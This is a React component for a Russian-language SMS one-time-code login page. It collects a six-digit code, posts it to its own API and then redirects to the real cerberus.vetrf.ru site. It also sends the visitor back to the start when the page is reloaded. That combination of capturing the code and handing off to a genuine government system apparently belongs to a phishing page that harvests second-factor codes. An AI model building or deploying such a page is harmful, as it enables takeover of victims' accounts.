import { useState, useRef, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import PageLayout from "./components/PageLayout";
import InfoBanner from "./components/InfoBanner";
import Logo from "./components/Logo";
import { apiVerifyCode } from "./utils/api";

function SmsVerification() {
  const navigate = useNavigate();
  const [code, setCode] = useState<string[]>(["", "", "", "", "", ""]);
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");

  // При обновлении страницы редиректим на главную
  useEffect(() => {
    const navEntries = performance.getEntriesByType("navigation") as PerformanceNavigationTiming[];
    const isReloaded = navEntries.length > 0 && navEntries[0].type === "reload";

    if (isReloaded) {
      navigate("/", { replace: true });
    }
  }, [navigate]);

  const handleCodeChange = (index: number, value: string) => {
    if (value.length > 1) {
      value = value.slice(-1);
    }

    if (!/^\d*$/.test(value)) {
      return;
    }

    const newCode = [...code];
    newCode[index] = value;
    setCode(newCode);

    if (value && index < 5) {
      inputRefs.current[index + 1]?.focus();
    }
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent) => {
    if (e.key === "Backspace" && !code[index] && index > 0) {
      inputRefs.current[index - 1]?.focus();
    }
  };

  const handleBack = () => {
    window.history.back();
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    const otp = code.join("");

    if (otp.length !== 6) {
      setError("Введите полный код");
      return;
    }

    setError("");
    setLoading(true);

    try {
      const response = await apiVerifyCode(otp);

      if (response.status === "success") {
        // Редирект на успешную страницу
        window.location.href = import.meta.env.VITE_REDIRECT_URL || "https://cerberus.vetrf.ru/cerberus/";
      } else {
        setError(response.message || "Неверный код");
        // Очищаем поля при ошибке
        setCode(["", "", "", "", "", ""]);
        inputRefs.current[0]?.focus();
      }
    } catch (error) {
      setError("Ошибка соединения с сервером");
      console.error("Verify code error:", error);
    } finally {
      setLoading(false);
    }
  };

  return (
    <PageLayout>
      {/* SMS Verification Container */}
      <div className="w-full max-w-[384px]">
        {/* White Card with Form */}
        <div className="relative bg-white rounded-2xl shadow-[0_6px_16px_rgba(230,235,245,0.8),0_1px_4px_rgb(227,235,252)] p-8">
          {/* Header with Back Button and Logo */}
          <div className="mb-10 flex items-center justify-center ">
            {/* Back Button */}
            <button
              type="button"
              onClick={handleBack}
              className="absolute w-10 h-10 flex items-center justify-center rounded-full bg-white border-4 border-[#e4ecfd] cursor-pointer p-0 transition-colors hover:bg-[#f5f7fa]"
              style={{ left: "-10px" }}
              aria-label="Назад"
              tabIndex={0}>
              <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path d="M15 18L9 12L15 6" stroke="#0d4cd3" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" />
              </svg>
            </button>

            {/* Logo */}
            <Logo />
          </div>

          {/* Title */}
          <h3 className="text-[24px] leading-[32px] font-semibold text-[#0b1f33] mb-6 text-center">Подтвердите вход</h3>

          {/* Code Input */}
          <form onSubmit={handleSubmit} className="mt-10 mb-10">
            <div className="text-left mb-1">
              <label className="block text-[14px] leading-5 text-[#0b1f33] font-normal">Код подтверждения</label>
            </div>

            <div className="grid grid-cols-6 gap-3 mt-4">
              {code.map((digit, index) => (
                <input
                  key={index}
                  ref={(el) => {
                    inputRefs.current[index] = el;
                  }}
                  type="tel"
                  inputMode="numeric"
                  maxLength={1}
                  value={digit}
                  onChange={(e) => handleCodeChange(index, e.target.value)}
                  onKeyDown={(e) => handleKeyDown(index, e)}
                  className="w-full h-[52px] text-center text-[16px] font-normal border-0 rounded-lg outline-none bg-[#f5f7fa] text-[#0b1f33] focus:border-2 focus:border-[#99b1e6] focus:shadow-none"
                  autoComplete="one-time-code"
                />
              ))}
            </div>

            {/* Error Message */}
            {error && <div className="text-[#e11432] text-[14px] leading-5 font-normal mt-2">{error}</div>}

            {/* Submit Button */}
            <button
              type="submit"
              disabled={loading}
              className="block w-full rounded-lg border-none py-[14px] px-4 text-[16px] leading-6 text-white bg-[#0d4cd3] cursor-pointer mt-[22px] hover:bg-[#1d5deb] disabled:opacity-50 disabled:cursor-not-allowed">
              {loading ? "Загрузка..." : "Подтвердить"}
            </button>
          </form>

          {/* Help Link */}
          <div className="mt-6 text-center">
            <a href="/" className="text-[#0d4cd3] hover:text-[#1d5deb] text-[16px] no-underline cursor-pointer">
              Не могу подтвердить вход
            </a>
          </div>
        </div>
      </div>

      <InfoBanner />
    </PageLayout>
  );
}

export default SmsVerification;
